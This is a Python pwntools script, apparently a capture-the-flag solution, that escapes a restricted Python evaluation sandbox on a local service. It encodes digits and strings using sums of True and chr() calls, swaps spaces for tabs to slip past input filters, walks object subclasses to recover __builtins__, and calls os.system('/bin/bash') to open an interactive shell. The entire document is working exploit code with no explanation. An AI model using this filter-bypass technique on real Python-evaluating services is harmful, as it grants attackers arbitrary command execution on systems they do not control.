from pwn import *

HOST, PORT = "localhost", 1234

io = remote(HOST, PORT)

digits = {
    "a": "False",
    "b": '+'.join(['True'] * 1),
    "c": '+'.join(['True'] * 2),
    "d": '+'.join(['True'] * 3),
    "e": '+'.join(['True'] * 4),
    "f": '+'.join(['True'] * 5),
    "g": '+'.join(['True'] * 6),
    "h": '+'.join(['True'] * 7),
    "i": '+'.join(['True'] * 8),
    "j": '+'.join(['True'] * 9),
}

def init():
    payload = ""
    for k, v in digits.items():
        payload += f"{k}=str(int({v}));"
    return payload

def build_digit(num):
    mapper = "abcdefghij"
    result = '+'.join([mapper[int(n)] for n in str(num)])
    result = f"int({result})"
    return result

def build_str(s):
    result = '+'.join([f"chr({build_digit(ord(c))})" for c in s])
    return result

payload = init()
payload += f"bi=().__class__.__class__.__subclasses__(().__class__.__class__).__getattribute__({build_str('pop')})({build_digit(0)}).register.__getattribute__({build_str('__builtins__')});"
payload += f"print((bi.__getitem__({build_str('__import__')}))({build_str('os')}).__getattribute__({build_str('system')})({build_str('/bin/bash')}));"
payload = payload.replace(" ", "\t")
print(payload.encode())
io.sendlineafter(b":", payload.encode())

io.interactive()